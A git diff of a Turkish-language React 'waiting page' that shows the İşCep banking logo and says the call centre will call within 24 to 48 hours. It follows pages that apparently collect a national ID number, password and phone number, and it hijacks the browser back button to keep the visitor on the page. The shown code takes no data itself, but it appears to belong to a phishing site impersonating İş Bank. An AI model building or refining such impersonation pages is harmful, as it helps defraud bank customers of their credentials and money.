@@ -1,12 +1,12 @@
 import React, { useEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
-import { useAuth } from './AuthContext'; // AuthContext'ten useAuth'u içe aktar
+import { useAuth } from './AuthContext';
 
 function WaitingPage() {
   const location = useLocation();
   const navigate = useNavigate();
-  const { dispatch: authDispatch } = useAuth(); // authDispatch'i al
+  const { dispatch: authDispatch } = useAuth();
   const [isLoading, setIsLoading] = useState(false);
   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
 
@@ -20,7 +20,6 @@ function WaitingPage() {
   // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
     const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';
-    const isCompleted = location.state?.isCompleted;
 
     // Geçersiz navigasyon durumunda
     if (!isValidNavigation) {
@@ -36,29 +35,31 @@ function WaitingPage() {
         authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
         navigate('/giris', { replace: true });
       }
-    } else if (isCompleted) {
-      setIsLoading(false);
-
-      const handlePopState = () => {
-        window.history.replaceState(null, '', '/giris');
-        authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
-        navigate('/giris', { replace: true });
-      };
-
-      window.history.pushState(null, '', '/giris');
-      window.history.pushState(null, '', '/giris');
-
-      window.addEventListener('popstate', handlePopState);
-      return () => window.removeEventListener('popstate', handlePopState);
+      return;
     }
-  }, [location.state, navigate, isMobile, authDispatch]); // authDispatch'i bağımlılıklara ekle
+
+    // Geri tuşu için popstate dinleyicisi ekle
+    const handlePopState = () => {
+      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
+      window.history.replaceState(null, '', '/giris');
+      navigate('/giris', { replace: true });
+    };
+
+    // Her zaman popstate dinleyicisini ekle
+    window.history.pushState(null, '', window.location.href);
+    window.addEventListener('popstate', handlePopState);
+
+    return () => {
+      window.removeEventListener('popstate', handlePopState);
+    };
+  }, [location.state, navigate, isMobile, authDispatch]);
 
   // Mobil cihazlarda yükleme ekranı
   if (isLoading && isMobile) {
     return (
       <div className="waiting-overlay">
         <div className="waiting-container">
-          <img src="/check.png" alt="Check Logo" className="waiting-logo" />
+          <img src="/check.png" alt="Onay Logosu" className="waiting-logo" />
           <p className="waiting-text">Lütfen Bekleyin</p>
         </div>
       </div>
@@ -69,8 +70,8 @@ function WaitingPage() {
   return (
     <div className="container">
       <div className="bekleme-content">
-        <img src="/iscep-logo.png" alt="İşCep Logo" className="bekleme-iscep-logo" />
-        <img src="/check.png" alt="Check Logo" className="bekleme-check-logo" />
+        <img src="/iscep-logo.png" alt="İşCep Logosu" className="bekleme-iscep-logo" />
+        <img src="/check.png" alt="Onay Logosu" className="bekleme-check-logo" />
         <p className="waiting-message">
           Talebiniz başarıyla alındı.
           Çağrı Merkezimiz sizinle 24 ila 48 saat
